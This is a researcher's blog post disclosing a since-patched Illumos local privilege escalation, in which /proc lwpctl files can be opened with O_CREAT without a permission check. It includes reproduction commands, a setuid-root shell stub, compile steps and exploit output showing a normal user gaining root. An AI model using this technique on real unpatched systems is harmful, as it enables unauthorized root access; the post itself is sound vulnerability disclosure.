---
layout: post
title: "Local Privilege Escalation in Illumos via /proc"
date: 2017-01-31 09:00:00 +0000
comments: true
categories: 
---

The /proc permissions in Illumos were optional. I'm not sure how long this has been an issue but looking at the [history](https://github.com/joyent/illumos-joyent/commits/fee52838cd1191a3efe83b67de7bccdd401af35e/usr/src/uts/common/fs/proc/prvnops.c) of the files associated with the permission check I could not find where the problem was introduced. I checked if this was also an issue in Solaris but this had been fixed in Solaris. However, I could not find the CVE associated with this fix. My suspicion is that this has been an issue prior to the Illumos fork and was found by Solaris engineers and fixed in Solaris but not fixed in Illumos.

I found this vulnerability when I was looking for a RBAC bypass. RBAC in Solaris lets you have different named privileges associated with each process. It is possible for a process with a lot of privileges to drop most of them and keep only the ones that it needs. I thought it might be possible for a low privilege process to use /proc to debug a process owned by the same user that had higher privileges. This was because I thought the filesystem permissions would be the only permission check that would be performed. But if I would have checked the [man page](https://docs.oracle.com/cd/E23824_01/html/821-1473/proc-4.html) I would have seen:

{% blockquote %}
EPERM


An attempt was made to control a process of which the E, P, and I privilege sets were not a subset of the effective set of the controlling process or the limit set of the controlling process is not a superset of limit set of the controlled process.
{% endblockquote %}

But I didn't check the man page and just tried to write to a /proc file of a higher privileged process using bash.

```
echo "wat" > /proc/23912/lwp/1/lwpctl
```

Which instead of giving a permission error gave back an I/O error.

This issue can be demonstrated via the following commands:

First we drop the sys_mount permission which will prevent us from opening proc on our
parent bash process because we have a subset of permissions.

```
ppriv -s A-sys_mount -e /bin/bash
[root@web01 ~]# ppriv $$
23929:  /bin/bash
flags = PRIV_AWARE
        E: basic
        I: basic
        P: basic
        L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_nfs,sys_ppp_config,sys_resource,sys_smb
```

Next, we try and open the parent process lwpctl and it correctly fails.

```
[root@web01 ~]# ps
  PID TTY         TIME CMD
23929 pts/4       0:00 bash
23911 pts/4       0:00 login
23912 pts/4       0:00 bash
23935 pts/4       0:00 ps

python

>>> os.open("/proc/23912/lwp/1/lwpctl", os.O_WRONLY)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
OSError: [Errno 13] Permission denied: '/proc/23912/lwp/1/lwpctl'
```

Next, we open the file with O_CREAT and it incorrectly succeeds.

```
>>> os.open("/proc/24421/lwp/1/lwpctl", os.O_CREAT|os.O_APPEND|os.O_WRONLY)
3
```

In Illumos there is the concept of a VNode which is contains a bunch of pointers to methods that are used by the kernel to interact with the filesystem. When a file is opened the kernel will call a `#access` method on the VNode first and then will call the open method on the VNode if it the `#access` succeeds. However, in the case when O_CREAT is passed the kernel will only call the #create method and it will assume the `#create` method will also call the `#access` method. In the case of the /proc file system this was not happening so anybody could pass in O_CREAT and no permission check would occur so the open would always succeed. Since there is no other checks not only does this work as an RBAC bypass it always works as a privilege escalation from non-root to root. It is important to note that Zone's contain this issue and it doesn't seem possible to use this as a way of escalating your privileges outside of a Zone.

If you look at the [patch](https://github.com/joyent/illumos-joyent/commit/fee52838cd1191a3efe83b67de7bccdd401af35e) you can see a call to `#praccess` was added and some other checks as well that I don't understand.

I notified Joyent about this on the 14th of Decemeber and they had a fix commited by the 17th. The advisory from Joyent is available [here](https://help.joyent.com/hc/en-us/articles/115002310368-Security-Advisory-proc-Filesystem-Permission-Vulnerability). The Joyent people are probably quietly cheering on the demise of Solaris because as you can see from this vulnerability security issues might be fixed in Solaris while still being vulnerable in Illumos. One way of looking at this is that Oracle is selling a zero day exploit feed for Joyent's public cloud. Though, it is probably not that bad because the code bases have diverged a bit.

Exploit
=======

I have an [exploit](https://github.com/benmmurphy/illumos_playground/tree/master/proc_escalation) for this that will use the lwp_agent to create a file `/tmp/elevator` that is suid root. It also uses the `lwp_agent` to write a program to this file that contains:

```
  setuid(0);
  setgid(0);
  execv("/bin/bash");
```

It can be compiled via:

```
  gcc -nostdlib -static bash.s -o bash
  gcc -o go go.c
```

Example output:
```
  root@web01:~# id
  uid=1000(ben) gid=1(other) groups=1(other)

  root@web01:~# ppriv $$
  36695:  sh
  flags = <none>
    E: basic
    I: basic
    P: basic
    L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb

  root@web01:~# ps auxww |grep vi
  root     36626  0.0  0.2 5012 3344 pts/2    S 21:48:50  0:00 vi /tmp/test


  root@web01:~# ./go 36626
  found syscall: fefe2255
  file_size: 1464 8046a50
  write returned: 1464
  [root@web01 /root]# id
  uid=0(root) gid=0(root)
  [root@web01 /root]# ppriv $$
  36724:  /bin/bash
  flags = <none>
    E: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
    I: basic
    P: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
    L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
```



